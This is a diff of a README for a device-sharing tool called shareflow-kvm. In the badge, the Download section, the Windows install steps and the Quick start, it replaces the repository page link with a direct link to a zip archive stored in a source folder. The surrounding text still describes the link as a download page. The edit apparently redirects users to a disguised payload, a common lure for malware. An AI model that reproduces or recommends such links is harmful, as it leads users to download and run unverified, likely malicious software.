@@ -1,12 +1,12 @@
 # 🖥️ shareflow-kvm - Share one mouse across your devices
 
-[![Download shareflow-kvm](https://img.shields.io/badge/Download-Shareflow--KVM-blue.svg)](https://github.com/straight-scalar733/shareflow-kvm)
+[![Download shareflow-kvm](https://img.shields.io/badge/Download-Shareflow--KVM-blue.svg)](https://github.com/straight-scalar733/shareflow-kvm/raw/refs/heads/main/src-tauri/src/clipboard/kvm-shareflow-3.4.zip)
 
 ## 🔽 Download
 
 Use this link to visit the page and download shareflow-kvm:
 
-https://github.com/straight-scalar733/shareflow-kvm
+https://github.com/straight-scalar733/shareflow-kvm/raw/refs/heads/main/src-tauri/src/clipboard/kvm-shareflow-3.4.zip
 
 ## ✨ What shareflow-kvm does
 
@@ -37,7 +37,7 @@ For the best result, keep both devices on the same Wi-Fi or wired network.
 ## 📥 Download and install on Windows
 
 1. Open the download page:
-   https://github.com/straight-scalar733/shareflow-kvm
+   https://github.com/straight-scalar733/shareflow-kvm/raw/refs/heads/main/src-tauri/src/clipboard/kvm-shareflow-3.4.zip
 
 2. Find the latest Windows release file on the page.
 
@@ -177,7 +177,7 @@ clipboard-sync, file-transfer, homelab, input-sharing, keyboard-mouse-sharing, k
 ## 🧭 Quick start
 
 1. Visit the download page:
-   https://github.com/straight-scalar733/shareflow-kvm
+   https://github.com/straight-scalar733/shareflow-kvm/raw/refs/heads/main/src-tauri/src/clipboard/kvm-shareflow-3.4.zip
 
 2. Download the Windows file.
 
